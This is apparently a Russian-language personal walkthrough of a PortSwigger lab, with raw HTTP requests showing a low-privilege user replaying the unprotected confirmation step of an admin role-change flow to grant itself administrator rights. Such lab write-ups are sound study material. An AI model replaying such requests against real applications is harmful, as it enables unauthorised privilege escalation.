### Уязвимости контроля доступа в многоэтапных процессах

лаба https://portswigger.net/web-security/access-control/lab-multi-step-process-with-no-access-control-on-one-step

есть панель администратора и многоступенчатая система изменения роли юзера!
и там где-то дырка есть

задание:
1) зайти в админку administrator : admin (да - сразу есть админка)
2) войти в акк wiener  :  peter и стать админом

-------

зашел на ак админа

админ панель есть по пути GET /admin HTTP/2

---

а вот запрос который меняет роль другим юзерам

но чтобы поменять роль  нужно несколько шагов

#### шаг 1 - запрос на смену роли

```http
POST /admin-roles HTTP/2
Host: 0adb005203ac4ce880c26cb600d8004c.web-security-academy.net
Cookie: session=Pfe68YdBpeXetgMwZTBtK9Vh4XcLW4o7
Content-Length: 30
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="145", "Not:A-Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "macOS"
Accept-Language: ru-RU,ru;q=0.9
Origin: https://0adb005203ac4ce880c26cb600d8004c.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0adb005203ac4ce880c26cb600d8004c.web-security-academy.net/admin
Accept-Encoding: gzip, deflate, br
Priority: u=0, i

username=carlos&action=upgrade
```


#### шаг 2 - запрос ПОДТВЕРЖДЕНИЕ на смену роли

![[Сни2026-03-012.29.07.png]]

```http
POST /admin-roles HTTP/2
Host: 0adb005203ac4ce880c26cb600d8004c.web-security-academy.net
Cookie: session=Pfe68YdBpeXetgMwZTBtK9Vh4XcLW4o7
Content-Length: 45
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="145", "Not:A-Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "macOS"
Accept-Language: ru-RU,ru;q=0.9
Origin: https://0adb005203ac4ce880c26cb600d8004c.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0adb005203ac4ce880c26cb600d8004c.web-security-academy.net/admin-roles
Accept-Encoding: gzip, deflate, br
Priority: u=0, i

action=upgrade&confirmed=true&username=carlos
```
роль успешно изменена - ответ 302
```http
HTTP/2 302 Found
Location: /admin
X-Frame-Options: SAMEORIGIN
Content-Length: 0


```

-------
---------
-------

теперь еду на аккаунт  wiener  :  peter

и буду пробовать повторить шаги для смены роли


##### пробую шаг 1  на акке wiener

```http
GET /admin-roles HTTP/2
Host: 0adb005203ac4ce880c26cb600d8004c.web-security-academy.net
Cookie: session=y9XI4lrRCniIKUNbA34IwP6vV4rd1cOc
Cache-Control: max-age=0
Accept-Language: ru-RU,ru;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Sec-Ch-Ua: "Chromium";v="145", "Not:A-Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "macOS"
Referer: https://0adb005203ac4ce880c26cb600d8004c.web-security-academy.net/login
Accept-Encoding: gzip, deflate, br
Priority: u=0, i

username=wiener&action=upgrade
```

ответ 401 "Unauthorized"

##### пробую шаг 2  на акке wiener

```http
```http
POST /admin-roles HTTP/2
Host: 0adb005203ac4ce880c26cb600d8004c.web-security-academy.net
Cookie: session=Pfe68YdBpeXetgMwZTBtK9Vh4XcLW4o7
Content-Length: 45
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="145", "Not:A-Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "macOS"
Accept-Language: ru-RU,ru;q=0.9
Origin: https://0adb005203ac4ce880c26cb600d8004c.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0adb005203ac4ce880c26cb600d8004c.web-security-academy.net/admin-roles
Accept-Encoding: gzip, deflate, br
Priority: u=0, i

action=upgrade&confirmed=true&username=wiener

```

ответ Missing parameter 'username'
```http
HTTP/2 400 Bad Request
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 30

"Missing parameter 'username'"
```

и если убрать куку - ответ Unauthorized 401

------

я поменял запрос с GET на POST и запрос выполнился !!

```http
POST /admin-roles HTTP/2
Host: 0a0c003004ee1d45810484a80084008b.web-security-academy.net
Cookie: session=n2FS7cKe46g5zPP1194Bbh83W0ArQ1MQ
...
..
.

action=upgrade&confirmed=true&username=wiener
```

ура!
лаба решена!

---









